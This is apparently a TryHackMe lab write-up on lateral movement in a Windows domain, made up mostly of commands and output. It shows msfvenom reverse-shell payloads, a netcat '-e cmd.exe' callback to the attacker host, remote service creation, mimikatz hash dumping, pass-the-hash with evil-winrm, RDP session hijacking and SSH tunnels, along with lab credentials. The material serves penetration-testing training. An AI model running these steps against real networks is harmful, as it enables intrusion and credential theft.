# Lateral Movement and Pivoting

## Task 1  Introduction
```bash
┌──(kali㉿kali)-[~/TryHackMe]
└─$ nslookup thmdc.za.tryhackme.com
Server:         10.200.51.101
Address:        10.200.51.101#53

Name:   thmdc.za.tryhackme.com
Address: 10.200.51.101
```
+ Connection to `http://distributor.za.tryhackme.com/creds` get credentials press button 
+ Your credentials have been generated: Username: arthur.campbell Password: Pksp9395

## Task 2  Moving Through the Network
+ Click and continue learning!

## Task 3  Spawning Processes Remotely
```bash
User: ZA.TRYHACKME.COM\t1_leonard.summers
Password: EZpass4ever
```
+ Generate MsfVenom
```bash
┌──(kali㉿kali)-[~/TryHackMe]
└─$ msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=lateralmovement LPORT=4444 -o dodol.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe-service file: 15872 bytes
Saved as: dodol.exe

┌──(kali㉿kali)-[~/TryHackMe]
└─$ smbclient -c 'put dodol.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
Password for [ZA\t1_leonard.summers]:
do_connect: Connection to thmiis.za.tryhackme.com failed (Error NT_STATUS_UNSUCCESSFUL)

┌──(kali㉿kali)-[~/TryHackMe]
└─$ smbclient -c 'put dodol.exe' -U t1_leonard.summers -W ZA '//10.200.51.201/admin$/' EZpass4ever
Password for [ZA\t1_leonard.summers]: 
putting file dodol.exe as \dodol.exe (7.7 kb/s) (average 7.7 kb/s)



msf6 exploit(multi/handler) > options
Module options (exploit/multi/handler):
   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------
Payload options (windows/shell/reverse_tcp):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.50.49.50      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:
   Id  Name
   --  ----
   0   Wildcard Target
View the full module info with the info, or info -d command.
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.50.49.50:4444


```
+ After Upload the Services and setup listener then triggering the service using:
```cmd.exe
runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe 10.50.49.50 4443"
```
+ Before running that please make sure to listen on port `4443`

```bash
┌──(kali㉿kali)-[~/TryHackMe]
└─$ nc -lvp 4443
listening on [any] 4443 ...
10.200.51.249: inverse host lookup failed: Unknown host
connect to [10.50.49.50] from (UNKNOWN) [10.200.51.249] 54119
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
za\arthur.campbell
```

+ Creating The Service using `sc.exe`
```bash (cmd)
C:\Windows\system32>sc.exe \\thmiis.za.tryhackme.com create DodolSvc binPath= "%windir%\dodol.exe" start= auto
sc.exe \\thmiis.za.tryhackme.com create DodolSvc binPath= "%windir%\dodol.exe" start= auto
[SC] CreateService SUCCESS

C:\Windows\system32>sc.exe \\thmiis.za.tryhackme.com start DodolSvc
sc.exe \\thmiis.za.tryhackme.com start DodolSvc

SERVICE_NAME: DodolSvc 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 4  RUNNING 
            (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 3312
        FLAGS              : 
```

+ After run the service we got the meterpreter session 
```bash 
[*] Started reverse TCP handler on 10.50.49.50:4444 
[*] Sending stage (240 bytes) to 10.200.51.201
[*] Command shell session 1 opened (10.50.49.50:4444 -> 10.200.51.201:52886) at 2024-01-17 12:28:04 +0700

Shell Banner:
Microsoft Windows [Version 10.0.17763.1098]
-----

C:\Windows\system32>whoami
whoami
nt authority\system
c:\Users\t1_leonard.summers\Desktop>Flag.exe
Flag.exe
THM{MOVING_WITH_SERVICES}
```
+ After running the "flag.exe" file on t1_leonard.summers desktop on THMIIS, what is the flag?`THM{MOVING_WITH_SERVICES}`


## Task 4  Moving Laterally Using WMI
+ Creating msi file 
```bash
┌──(kali㉿kali)-[~/TryHackMe]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > dodol.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes

┌──(kali㉿kali)-[~/TryHackMe]
└─$ smbclient -c 'put dodol.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
Password for [ZA\t1_corine.waters]:
do_connect: Connection to thmiis.za.tryhackme.com failed (Error NT_STATUS_UNSUCCESSFUL)

┌──(kali㉿kali)-[~/TryHackMe]
└─$ smbclient -c 'put dodol.msi' -U t1_corine.waters -W ZA '//10.200.51.201/admin$/' Korine.1994
Password for [ZA\t1_corine.waters]:
putting file dodol.msi as \dodol.msi (72.6 kb/s) (average 72.6 kb/s)

┌──(kali㉿kali)-[~/TryHackMe]
└─$ msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST lateralmovement; set LPORT 4445;exploit"


Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\dodol.msi"; Options = ""; AllUsers = $false}

C:\Users\t1_corine.waters\Desktop>Flag.exe
Flag.exe
THM{MOVING_WITH_WMI_4_FUN}
```

## Task 5  Use of Alternate Authentication Material
+ What is the flag obtained from executing "flag.exe" on t1_toby.beck's desktop on THMIIS? `THM{NO_PASSWORD_NEEDED}`

```bash
Microsoft Windows [Version 10.0.14393]          
(c) 2016 Microsoft Corporation. All rights reserved.                

za\t2_felicia.dean@THMJMP2 C:\tools>mimikatz    

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53        
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)     
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )                
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz             
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )               
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/               

mimikatz # privilege::debug 
Privilege '20' OK 
mimikatz # token::elevate   
Token Id  : 0               
User name :                 
SID name  : NT AUTHORITY\SYSTEM                 

504     {0;000003e7} 1 D 16945          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary     
 -> Impersonated !          
 * Process Token : {0;00439300} 0 D 4431384     ZA\t2_felicia.dean      S-1-5-21-3330634377-1326264276-632209373-4605   (12g,24p
)       Primary             
 * Thread Token  : {0;000003e7} 1 D 4503867     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegatio
n)

mimikatz# lsadump::sam
Domain : THMJMP2   
SysKey : 2e27b23479e1fb1161a839f9800119eb
Local SID : S-1-5-21-1946626518-647761240-1897539217 
SAMKey : 9a74a253f756d6b012b7ee3d0436f77a                  
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 0b2571be7e75e3dbd169ca5352a2dad7
RID  : 000001f5 (501)                 
User : Guest           
RID  : 000001f7 (503)
User : DefaultAccount 

mimikatz # sekurlsa::msv              
[....More Stuff....]   

Authentication Id : 0 ; 688557 (00000000:000a81ad)        
Session           : RemoteInteractive from 4              
User Name         : t1_toby.beck1     
Domain            : ZA                
Logon Server      : THMDC             
Logon Time        : 1/17/2024 12:09:56 PM                 
SID               : S-1-5-21-3330634377-1326264276-632209373-4616             
        msv :     
         [00000003] Primary           
         * Username : t1_toby.beck1   
         * Domain   : ZA              
         * NTLM     : 533f1bd576caa912bdb9da284bbc60fe    
         * SHA1     : 8a65216442debb62a3258eea4fbcbadea40ccc38                
         * DPAPI    : 489fed8eeb5acc4ffb205663491b62d3    
                  
[....More Stuff....]   

┌──(kali㉿kali)-[~/TryHackMe]
└─$ evil-winrm -i 10.200.51.201 -u t1_toby.beck -H 533f1bd576caa912bdb9da284bbc60fe
*Evil-WinRM* PS C:\Users\t1_toby.beck\Desktop> .\Flag.exe
THM{NO_PASSWORD_NEEDED}

```

## Task 6  Abusing User Behaviour
+ What flag did you get from hijacking t1_toby.beck's session on THMJMP2?`THM{NICE_WALLPAPER}`

+ New Credential `t2_eric.harding:Kegq4384`

```bash
┌──(kali㉿kali)-[~/TryHackMe]
└─$ xfreerdp /v:thmjmp2.za.tryhackme.com /u:t2_eric.harding /p:Kegq4384


C:\Windows\system32>query user
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 t1_toby.beck5                             2  Disc            .  1/17/2024 12:00 PM
 t1_toby.beck                              3  Disc            1  1/17/2024 12:09 PM
 t1_toby.beck1                             4  Disc            .  1/17/2024 12:09 PM
 t1_toby.beck2                             5  Disc            .  1/17/2024 12:10 PM
 t1_toby.beck3                             6  Disc            .  1/17/2024 12:10 PM
 t1_toby.beck4                             7  Disc            .  1/17/2024 12:10 PM
 natasha.howells                           8  Disc            5  1/17/2024 12:39 PM
 t2_felicia.dean                           9  Disc           38  1/17/2024 1:03 PM
 t2_eric.harding       rdp-tcp#68         10  Active          .  1/17/2024 1:48 PM

C:\Windows\system32>tscon 3 /dest:rdp-tcp#68

THM{NICE_WALLPAPER}
```

## Task 7  Port Forwarding
+ What is the flag obtained from executing "flag.exe" on t1_thomas.moore's desktop on THMIIS?`THM{SIGHT_BEYOND_SIGHT}`
+ What is the flag obtained using the Rejetto HFS exploit on THMDC? `THM{FORWARDING_IT_ALL}`

+ New Credential `jasmine.stanley:G0O6Zd5aM`
```bash
C:\> ssh tunneluser@10.50.49.50 -R 3389:10.200.51.101:3389 -N

┌──(kali㉿kali)-[~/TryHackMe]
└─$ xfreerdp /v:127.0.0.1 /u:t1_thomas.moore /p:MyPazzw3rd2020
THM{SIGHT_BEYOND_SIGHT}


C:\> ssh tunneluser@10.50.49.50 -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N


C:\hfs>type flag.txt
type flag.txt
THM{FORWARDING_IT_ALL}
```
## Task 8  Conclusion